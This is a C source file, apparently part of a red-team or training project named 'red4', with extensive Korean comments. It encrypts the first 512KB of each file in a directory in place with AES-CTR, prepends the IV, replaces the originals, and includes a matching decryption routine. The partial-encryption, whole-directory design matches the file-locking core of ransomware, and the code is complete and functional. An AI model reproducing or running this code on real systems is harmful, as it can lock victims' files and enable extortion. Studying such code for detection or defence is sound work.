#include <stdio.h>
#include <dirent.h>     // opendir, readdir
#include <string.h>     // snprintf
#include <fcntl.h>      // open
#include <unistd.h>     // close, read, write, rename, unlink
#include <limits.h>     // PATH_MAX

#include "red4_external/aes.h"   // Tiny-AES-c (AES_ctx, AES_init_ctx_iv, AES_CTR_xcrypt_buffer)
#include "red4_util.h"       // generate_random, create_tmp_file, commit_tmp_file
#include "red4_aes_file.h"   // encrypt_file_ctr, decrypt_file_ctr, process_directory


// ------------------------------------------------------------
// 파일 하나를 AES-CTR로 "암호화" (Encrypt 전용)
//  - [임시파일] = IV(16B) + (앞 512KB 암호화) + (나머지 원본)
// ------------------------------------------------------------
int encrypt_file_ctr(const char *filepath, unsigned char *key)
{
    int orig_fd  = -1;     		// 원본 파일 open 결과, 파일 디스크립터 저장할 변수 초기화
    int tmp_fd = -1;        		// 임시 파일 open 결과, 파일 디스크립터 저장할 변수 초기화
    unsigned char iv[AES_IVLEN];   	// IV벡터 값 저장할 문자열
    char tmp_path[PATH_MAX];      	// 임시 파일 경로명(파일명)

    // 원본 파일 읽기 전용으로 open
    orig_fd = open(filepath, O_RDONLY);
    if (orig_fd == -1) {
        perror("open 입력 실패");
        return -1;
    }

    // 임시 파일 생성
    if (create_tmp_file(filepath, tmp_path, &tmp_fd) == -1) {
        close(orig_fd);
        return -1;
    }

    printf("--- 파일 암호화 처리: %s ---\n", filepath);

    struct AES_ctx ctx;            	// AES 연산에 필요한 구조체(키, 카운터, Round키 등을 저장)
    size_t remaining = ENCRYPT_SIZE;	// 최대 512KB만 암/복호화
    unsigned char buffer[4096];   	// 한 번에 4KB 씩 읽고, 암/복호화 진행 (페이지 단위 ,OS처리 효율)
    ssize_t read_result;		// read() 함수의 반환 값(읽은 바이트 수)를 저장하는 변수

    // -------------------------
    // 암호화: IV 생성 → tmp 파일에 맨 앞에 저장
    // -------------------------
    if (generate_random(iv, AES_IVLEN) != 0) {	// AES_IVLEN = IV길이 16byte =128bit
        printf("IV 생성 실패\n");			// iv == unsigned char iv[AES_IVLEN]; IV벡터
        close(orig_fd);					// 원본 파일 open 결과인 파일 디스크립터 close
        close(tmp_fd);					// 임시 파일 open 결과인 파일 디스크립터 close
        unlink(tmp_path);				// 임시 파일 삭제
        return -1;
    }

    // 임시 파일에 IV 16바이트 먼저 기록
    if (write(tmp_fd, iv, AES_IVLEN) != AES_IVLEN) { 	// write(파일디스크립터, 기록할 문자열 버퍼, 길이)	//tmp_fd tmp_fd로 변환하기
        perror("IV write 실패");
        close(orig_fd);
        close(tmp_fd);
        unlink(tmp_path);
        return -1;
    }

    // ------------------------------------------------------------
    // 암호화를 위한 준비물을 담기위해 Tiny-AES-C(aes.c)에서 제공하는 함수
    // AES_init_ctx_iv(AES_ctx구조체, 키, iv)
    // AES 연산에 필요한 키, 카운터, Round키 등을 저장하는 "AES_ctx 구조체"에 키와 IV 를 설정한다.
    // ------------------------------------------------------------
    AES_init_ctx_iv(&ctx, key, iv); // CTR 초기화

    // ------------------------------------------------------------
    // 본문 처리: 앞에서부터 최대 512KB 구간만 CTR 적용
    // (앞에서 ctx 구조체에 기록한 키, IV를 기반으로 암호화 적용)
    // 원본 파일을 계속 4kb씩 끝까지 읽는다. (buffer에 최대 4096 바이트씩 저장)
    // read()함수가 자동으로 다음 부분을 읽는다.
    // ------------------------------------------------------------
    while ((read_result = read(orig_fd, buffer, sizeof(buffer))) > 0) {	
	// 처음 읽는 구간부터 4KB 단위로 remaining(512KB) 만큼만 암호화
        if (remaining > 0) {		// 처음에는 512KB, 4KB 단위로 암호화 할 수록 점점 줄어든다.
            size_t to_crypt;

            if (remaining >= (size_t)read_result)	// 만약 남은 암호화할 바이트 수 >= 읽은 바이트 수
                to_crypt = (size_t)read_result;         // => 실제로 암호화할 바이트 수 == read_result       			
            else					// 만약 남은 암호화할 바이트 수 < 읽은 바이트 수
                to_crypt = remaining;			//// => 실제로 암호화할 바이트 수 == remaining
	    
            AES_CTR_xcrypt_buffer(&ctx, buffer, to_crypt); // ctx구조체에 저장된 키와 IV 정보를 기반으로, buffer에 들어 있는 앞 to_crypt 바이트만큼 암호화한다

            remaining -= to_crypt; // remaining에서 이번에 처리한 만큼(to_crypt) 차감, // 나머지 부분(r - to_crypt)은 평문 그대로 둠
        }
	// 처리된 buffer 내용을 임시파일에 그대로 write
        if (write(tmp_fd, buffer, read_result) != read_result) { // 임시 파일에, buffer 내용을, read한 길이만큼 작성
            perror("임시 파일 write 실패");
            close(orig_fd);
            close(tmp_fd);
            unlink(tmp_path);
            return -1;
        }
    }
    // read() 결과가 0보다 작으면 오류 발생
    if (read_result < 0) {
        perror("본문 read 실패");
        close(orig_fd);
        close(tmp_fd);
        unlink(tmp_path);
        return -1;
    }

    close(orig_fd);
    close(tmp_fd);

    // 위의 과정을 통해서 암호화 모드로 동작하는 경우 : tmp = [IV+암호문] 형성
    // commit_tmp_file 함수로 임시 파일의 이름(tmp_path)을 원본 파일의 이름(filepath)으로 변경한다.
    // 이때  원본 파일은 삭제(unlink) 한다.
    if (commit_tmp_file(tmp_path, filepath) != 0)
        return -1;

    printf(" [*] 암호화 완료: %s\n", filepath);
    return 0;
}


// ------------------------------------------------------------
// 파일 하나를 AES-CTR로 "복호화" (Decrypt 전용)
//  - [원본파일] = IV(16B) + (앞 512KB 암호화)
//  - [임시파일] = (앞 512KB 복호화) + (나머지)
// ------------------------------------------------------------
int decrypt_file_ctr(const char *filepath, unsigned char *key)
{
    int orig_fd  = -1;			// 원본 파일 open 결과로 파일 디스크립터 생성 -> orig_fd
    int tmp_fd = -1;			// 복사 할 파일 open 결과로 파일 디스크립터 생성 -> tmp_fd
    unsigned char iv[AES_IVLEN];	// IV벡터+암호화문 에서  IV벡터 추출하여 저장할 문자열 변수
    char tmp_path[PATH_MAX];		// 복사 할 파일 경로명(파일명)

    // 원본 파일 읽기 전용으로 open
    orig_fd = open(filepath, O_RDONLY);
    if (orig_fd == -1) {
        perror("open 입력 실패");
        return -1;
    }

    // 임시 파일 생성
    if (create_tmp_file(filepath, tmp_path, &tmp_fd) == -1) {
        close(orig_fd);
        return -1;
    }

    printf("--- 파일 복호화 처리: %s ---\n", filepath);

    // 원본파일의 16byte를 읽어 iv에 저장 및 길이가 16byte인지 확인
    if (read(orig_fd, iv, AES_IVLEN) != AES_IVLEN) {
        printf("IV 읽기 실패 (암호화된 파일이 아님)\n");
        close(orig_fd);
        close(tmp_fd);
        unlink(tmp_path);
        return -1;
    }

    // 암호화된 파일에서 맨앞 16byte즉 iv를 읽은 후
    // Tiny-AES-C(aes.c) 에서 제공하는 함수로 AES 연산에 필요한 키, 카운터, Round키 등을 저장하는 "AES_ctx 구조체"에 키와 IV 설정하는 함수
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);

    // ------------------------------------------------------------
    // 본문 처리: 앞에서부터 최대 512KB 구간만 CTR 적용
    // (앞에서 ctx 구조체에 기록한 또는 읽어온 키, IV를 기반으로 복호화 적용)
    // 원본 파일을 계속 4kb씩 끝까지 읽는다. (buffer에 최대 4096 바이트씩 저장)
    // read()함수가 자동으로 다음 부분을 읽는다.
    // ------------------------------------------------------------
    size_t remaining = ENCRYPT_SIZE;	// 최대 512KB만 암/복호화
    unsigned char buffer[4096];		// 한 번에 4KB 씩 읽고, 암/복호화 진행 (페이지 단위 ,OS처리 효율)
    ssize_t read_result;		// read() 함수의 반환 값(읽은 바이트 수)를 저장하는 변수

    // 처음 읽는 구간부터 4KB 단위로 remaining(512KB) 복호화
    while ((read_result = read(orig_fd, buffer, sizeof(buffer))) > 0) {

        if (remaining > 0) {		// 처음에는 512KB, 4KB 단위로 복호화 할 수록 점점 줄어든다.
            size_t to_crypt;
            if (remaining >= (size_t)read_result)	// 만약 남은 복호화할 바이트 수 >= 읽은 바이트 수
                to_crypt = (size_t)read_result;		// 복호화할 바이트 수 == 읽은 바이트 수
            else					// 만약 남은 복호화할 바이트 수 < 읽은 바이트 수
                to_crypt = remaining;			// 실제로 복호화할 바이트 수 == remaining
      
	 // ctx구조체에 저장된 키와 IV 정보를 기반으로, buffer에 들어 있는 앞 to_crypt 바이트만큼 복호화한다
	 // 복호화 함수(== 암호화 함수) 왜냐하면 CTR 모드가 스트림 암호이기 때문이다.
            AES_CTR_xcrypt_buffer(&ctx, buffer, to_crypt);
            remaining -= to_crypt;	// remaining에서 이번에 처리한 만큼(to_crypt) 차감
            				// 나머지 부분(r - to_crypt)은 평문 그대로 둠
        }

        // 처리된 buffer 내용을 임시파일에 그대로 write
        // 임시 파일에, buffer 내용을, read한 길이만큼 작성
        if (write(tmp_fd, buffer, read_result) != read_result) {
            perror("임시 파일 write 실패");
            close(orig_fd);
            close(tmp_fd);
            unlink(tmp_path);
            return -1;
        }
    }
    // read() 결과가 0보다 작으면 오류 발생
    if (read_result < 0) {
        perror("본문 read 실패");
        close(orig_fd);
        close(tmp_fd);
        unlink(tmp_path);
        return -1;
    }

    close(orig_fd);
    close(tmp_fd);

    // 위의 과정을 통해서 복호화 모드로 동작하는 경우 : tmp = [복호화된 평문]
    // commit_tmp_file 함수를 통해 임시 파일의 이름(tmp_path)을 원본 파일의 이름(filepath)으로 변경한다.
    // 이때 원본 파일은 삭제(unlink) 한다.
    if (commit_tmp_file(tmp_path, filepath) != 0)
        return -1;

    printf(" [*] 복호화 완료: %s\n", filepath);
    return 0;
}


// ------------------------------------------------------------
// 디렉터리 내 모든 파일 처리
//   - encrypt != 0 : encrypt_file_ctr()
//   - encrypt == 0 : decrypt_file_ctr()
// FUSE 대응: stat(), fstat() 제거
//   → 파일 여부는 open 가능 여부로 판단
// ------------------------------------------------------------
int process_directory(const char *dirpath, unsigned char *key, int encrypt)
{
    DIR *dir = opendir(dirpath);   // DIR 구조체 반환
    
    if (!dir) {
        perror("opendir 실패");
        return -1;
    }

    struct dirent *entry;	// readdir 반환값, 디렉터리 안에 있는 파일 1개에 대한 정보, open, write 등의 함수 사용시 사용된다. 
    char filepath[PATH_MAX];	// opendir -> readdir 구조체 반환값 -> 파일명 추출-> 이를 기반으로 파일 경로 생성 를 저장할 변수 -> open, write
   
    //--------------------------------------------------------------------
    // readdir(*DIR) 함수를 통해 DIR 구조체 내부에 있는 파일 엔트리 하나에 대한 dirent 구조체 반환
    // 기본적으로 디렉터리는 현재/부모 디렉터리".", ".."를 엔트리로 가진다. 나머지는 엔트리는 파일
    // dirent 구조체는 파일 이름(d_name) 등의 정보를 담고 있다.
    //--------------------------------------------------------------------
    while ((entry = readdir(dir)) != NULL) {

        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, ".."))
            continue;
            
        // 파일경로 추출
	// snprintf(buffer, buffer_size, "포맷 형식", 값...); 버퍼에 “포맷 형식”과 값에 매핑된 결과 저장
        snprintf(filepath, sizeof(filepath), "%s/%s", dirpath, entry->d_name);

        // ================================
        // FUSE 대응 핵심 로직:
        // open() 가능하면 파일, 불가능하면 디렉터리
        // ================================
        int fd = open(filepath, O_RDONLY);
        if (fd < 0) {
            // 디렉터리이거나 읽을 수 없는 항목 → skip
            continue;
        }
        close(fd);

        // 실제 암/복호화 처리
        if (encrypt)
            encrypt_file_ctr(filepath, key);
        else
            decrypt_file_ctr(filepath, key);
    }

    closedir(dir);
    return 0;
}
